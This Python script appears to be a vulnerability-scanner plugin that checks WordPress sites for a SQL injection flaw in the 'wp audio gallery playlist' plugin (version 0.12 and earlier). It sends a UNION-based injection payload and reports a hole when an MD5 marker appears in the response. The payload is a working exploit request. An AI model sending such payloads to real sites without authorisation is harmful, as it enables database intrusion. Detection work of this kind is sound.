#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  WordPress wp audio gallery playlist plugin <= 0.12 SQL Injection Vulnerability
From : http://www.exploit-db.com/exploits/17756/
"""
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = ("/wp-content/plugins/wp-audio-gallery-playlist/playlist.php?post_gallery=-1%27%20UNION%20ALL%20SELECT%201,2,3,4,5,database(),MD5(3.14),8,9,10,11,12,13,14,15,16,17,18,version(),20,21,22,23--%20")
    target_url=arg + payload
    code, head, res, _, _ = curl.curl("%s" % target_url)
    if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
        security_hole(target_url)

if __name__ == '__main__':
    import sys
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])